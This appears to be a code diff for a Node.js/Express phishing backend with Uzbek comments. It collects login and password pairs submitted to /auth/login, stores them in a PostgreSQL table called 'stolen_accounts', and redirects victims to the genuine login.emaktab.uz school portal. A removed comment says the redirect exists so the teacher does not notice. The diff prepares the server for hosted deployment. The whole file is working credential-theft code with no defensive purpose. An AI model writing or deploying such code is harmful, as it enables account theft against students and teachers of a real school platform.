@@ -1,41 +1,39 @@
+require('dotenv').config();
 const express = require("express");
 const { Pool } = require("pg");
 const path = require("path");
 const app = express();
 
-// 1. PostgreSQL ulanishi
 const pool = new Pool({
-  user: "postgres", // Postgres foydalanuvchi nomi
-  host: "localhost",
-  database: "phishing_db", // Bazangiz nomi
-  password: "qwerty", // Postgres parolingiz
-  port: 5432,
+  connectionString: process.env.DATABASE_URL,
+  ssl: {
+    rejectUnauthorized: false 
+  }
 });
 
 app.use(express.urlencoded({ extended: true }));
-app.use(express.static("public")); // Sahifani ko'rsatish uchun
+app.use(express.static("public"));
 
-// 2. Ma'lumotni qabul qilish
 app.post("/auth/login", async (req, res) => {
   const { login, password } = req.body;
 
   try {
-    // Ma'lumotni PostgreSQL bazasiga yozamiz
     await pool.query(
       "INSERT INTO stolen_accounts (login, password) VALUES ($1, $2)",
-      [login, password],
+      [login, password]
     );
 
-    console.log(`Baza yangilandi: ${login} tutildi!`);
-
-    // 3. Ustoz sezib qolmasligi uchun haqiqiy saytga yuboramiz
+    console.log(`Baza yangilandi: ${login} saqlandi!`);
     res.redirect("https://login.emaktab.uz");
+
   } catch (err) {
-    console.error("Xatolik:", err);
+    console.error("Xatolik yuz berdi:", err);
     res.redirect("https://login.emaktab.uz");
   }
 });
 
-app.listen(3000, () =>
-  console.log("Server http://localhost:3000 da ishga tushdi"),
-);
+// 3. Portni sozlash (Render avtomatik port tayinlaydi)
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+  console.log(`Server ${PORT}-portda ishga tushdi`);
+});
